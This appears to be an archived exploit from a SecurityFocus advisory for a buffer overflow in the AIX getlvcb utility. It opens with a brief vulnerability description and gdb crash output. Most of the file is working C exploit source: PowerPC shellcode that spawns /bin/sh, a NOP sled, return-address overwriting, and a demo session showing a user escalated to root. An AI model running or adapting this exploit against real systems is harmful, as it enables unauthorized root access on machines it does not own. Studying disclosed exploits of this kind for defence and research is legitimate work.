// source: https://www.securityfocus.com/bid/9905/info

getlvcb has been reported to be prone to a buffer overflow vulnerability.

When an argument is passed to the getlvcb utility, the string is copied into a reserved buffer in memory. Data that exceeds the size of the reserved buffer will overflow its bounds and will trample any saved data that is adjacent to the affected buffer. Ultimately this may lead to the execution of arbitrary instructions in the context of the root user.

An attacker will require system group privileges prior to the execution of the getlvcb utility, the attacker may exploit the issue described in BID 9903 in order to gain the necessary privileges required to exploit this vulnerability.

/********************************************************************
 * Secure Network Operations (http://www.secnetops.com)
 * Local AIX getlvcb Exploit
 * by: mattox@secnetops.com
 * Program Description:
 *
 * Vulnerability Details:
 *
 * # gdb -q /usr/sbin/getlvcb
 * (no debugging symbols found)...(gdb) set args `perl -e 'print "A" x 183'`ABCD
 * (gdb) r
 * Starting program: /usr/sbin/getlvcb `perl -e 'print "A" x 183'`ABCD
 *
 * Program received signal SIGSEGV, Segmentation fault.
 * 0x41424344 in ?? ()
 * (gdb) bt
 * #0  0x41424344 in ?? ()
 * (gdb) i r
 * r0             0x6000328e       1610625678
 * r1             0x2ff228a0       804399264
 * r2             0xf012de88       -267198840
 * r3             0x1      1
 * r4             0x9      9
 * r5             0x2ff22ff8       804401144
 * r6             0xd030   53296
 * r7             0x0      0
 * r8             0x60000000       1610612736
 * r9             0x600039ce       1610627534
 * r10            0x0      0
 * r11            0x6000214a       1610621258
 * r12            0x41424344       1094861636
 * r13            0x200008b0       536873136
 * r14            0x0      0
 * r15            0x0      0
 * r16            0x0      0
 * r17            0x0      0
 * r18            0x0      0
 * r19            0x0      0
 * r20            0x0      0
 * r21            0x0      0
 * r22            0x0      0
 * r23            0x0      0
 * r24            0x0      0
 * r25            0x0      0
 * r26            0x0      0
 * r27            0x0      0
 * r28            0x41414141       1094795585
 * r29            0x41414141       1094795585
 * r30            0x41414141       1094795585
 * r31            0x41414141       1094795585
 * pc             0x41424344       1094861636
 * ps             0x4000d030       1073795120
 * cr             0x26222444       639771716
 * lr             0x41424344       1094861636
 * ctr            0x0      0
 * xer            0x0      0
 * fpscr          0x0      0
 * vscr           0x0      0
 * vrsave         0x0      0
 *
 * .............................................................
 * $ uname -a
 * AIX thunderfoot 1 5 002064864C00
 *
 * $ whoami
 * kinet1k
 *
 * $ id
 * uid=7(kinet1k) gid=1(staff) groups=0(system)
 * $ ./r00tme 208 231
 *
 * Secure Network Operations (written by: mattox@secnetops.com)
 * AIX Local getlvncb exploit
 *
 * Fixin to overwrite the address: 0x2ff2283d
 * Using a buffer size of: 208
 * And an offset of: 231
 *
 * # whoami
 * root
 *
 * # id
 * uid=0(root) gid=1(staff) groups=0(system)
 *..............................................................
 *
 *********************************************************************/
#include <stdlib.h>
#include <string.h>

#define OFFSET                           0
#define BUFFERSIZE                     208
#define NOP             "\x7c\xa5\x2a\x79"
#define RETURNADDR              0x2ff22924

char shellcode[ ] =
        "\x7e\x94\xa2\x79\x40\x82\xff\xfd\x7e\xa8\x02\xa6\x3a\xb5\x01\x40"
    "\x88\x55\xfe\xe0\x7e\x83\xa3\x78\x3a\xd5\xfe\xe4\x7e\xc8\x03\xa6"
    "\x4c\xc6\x33\x42\x44\xff\xff\x02\xb6\x05\xff\xff\x7e\x94\xa2\x79"
    "\x7e\x84\xa3\x78\x40\x82\xff\xfd\x7e\xa8\x02\xa6\x3a\xb5\x01\x40"
    "\x88\x55\xfe\xe0\x7e\x83\xa3\x78\x3a\xd5\xfe\xe4\x7e\xc8\x03\xa6"
    "\x4c\xc6\x33\x42\x44\xff\xff\x02\xb7\x05\xff\xff\x38\x75\xff\x04"
    "\x38\x95\xff\x0c\x7e\x85\xa3\x78\x90\x75\xff\x0c\x92\x95\xff\x10"
    "\x88\x55\xfe\xe1\x9a\x95\xff\x0b\x4b\xff\xff\xd8/bin/sh";


int main( int argc, char *argv[ ] )
{
        int i;
    int offset = OFFSET, bufferSize = BUFFERSIZE;
    unsigned long esp, returnAddress, *addressPointer;
    char *buffer, *pointer;

        /* Usage */
        if( argv[ 1 ] ) {
                if( strncmp( argv[ 1 ], "-h", 3 ) == 0 || strncmp( argv[ 1 ], "-H", 3 ) == 0 ) {
                printf( "\n\tUsage:  %s <buffer size> <offset>\n\n", argv[ 0 ] );
            exit( 0 );
        }
        }

    if( argc > 1 ) {
        bufferSize = atoi( argv[ 1 ] );
    }

    if( argc > 2 ) {
        offset = atoi( argv[ 2 ] );
    }

    returnAddress = RETURNADDR - offset;

    printf( "\nSecure Network Operations (written by: mattox@secnetops.com)\n" );
    printf( "AIX Local getlvncb exploit\n\n" );
    printf( "Fixin to overwrite the address: 0x%x\n", returnAddress );
    printf( "Using a buffer size of: %i\n", bufferSize );
    printf( "And an offset of: %i\n", offset );

    if( !( buffer = malloc( bufferSize ) ) ) {
        printf( "Coundn't allocate memory.\n" );
        exit( 0 );
    }

        /* I know, this is weird stuff...had to sub odd number to get ret addy to align */
    pointer = buffer - 1;

    addressPointer = ( long * )pointer;

    for( i = 0; i < bufferSize; i+=4 ) {
        *( addressPointer++ ) = returnAddress;
    }

    for( i = 0; i < ( bufferSize / 2 ); i+=4 ) {
        buffer[ i ] = ( unsigned long )NOP;
    }

    pointer = buffer + ( ( bufferSize / 2 ) - ( strlen( shellcode )/2 ) );

    for( i = 0; i < strlen( shellcode ); i++ ) {
        *( pointer++ ) = shellcode[ i ];
    }

    buffer[ bufferSize - 1 ] = '\0';

    execl( "/usr/sbin/getlvcb", "getlvcb", buffer, 0 );

    free( buffer );

    return 0;

}